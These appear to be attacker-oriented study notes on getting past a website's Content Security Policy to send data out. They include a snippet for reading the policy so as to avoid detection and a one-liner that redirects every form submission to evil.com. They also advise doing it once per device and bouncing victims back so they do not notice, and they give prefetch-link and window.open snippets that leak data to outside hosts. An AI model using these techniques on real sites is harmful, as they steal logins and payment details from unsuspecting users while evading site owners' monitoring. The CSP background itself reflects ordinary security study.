Sources:
1) https://medium.com/bugbountywriteup/bypass-csp-by-abusing-xss-filter-in-edge-43e9106a9754
2) https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5
3) https://www.w3.org/TR/CSP2/
4) https://medium.com/@lukaw3d/any-way-to-prevent-outgoing-connections-through-window-open-https-legit-analytics-com-q-b7556f095117

## CSP
CSP Stands for **Content Security Protection** which prevents content from being put into a web page to either allow data IN or let data OUT.

### CSP Structure
CSP can be added in one of two ways:
- `<meta>` tags embedded in the webpage. Example:
``<meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’”>``
- Content-Security-Policy HTTP response header field

It is designed to restrict what you can bring into the browser, but can also — as a side effect — limit the ways in which data can be sent out.
It is separated into different elements to determine which HTML elements are allowed to be used in the webpage.
Simply attempting to send data out from a site with CSP enabled can alert the site owner of the failed attempt if they specify a `report-uri`.
To avoid detection, we can get all the CSP data and read the headers:
```
fetch(document.location.href)
.then(resp => {
  const csp = resp.headers.get('Content-Security-Policy');
  // does this exist? Is is any good?
});
```
This avoids us actually hitting the CSP as we can simply read what CSP is running on the page.

#### Bypasses
In a lot of instances, a `default-src` is set as a "catch-all" but this doesn't actually catch all. Often, `form-action` is not locked down.

So when checking CSP, if there's no `form-action` CSP in place, we can simply change where the data is sent to when you click `sign in` or submit your form. We can do that with:
`Array.from(document.forms).forEach(formEl => formEl.action = '//evil.com/bounce-form');`

If using the above trick, only do it once per device and bounce the user back to the referring page so they can try again without noticing what happened.

Another method commonly used are the following lines of code:
```javascript {cmd="node"}
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

##### Intrusive data out
*Source 4*
If struggling to make outbound HTTP requests from the page, we could consider doing `window.open(‘https://legit-analytics.com?q=${payload}', ‘_blank’).close()`. It's incredibly intrusive and would probably give alarm bells but it's just another option if CSP is bugging you.
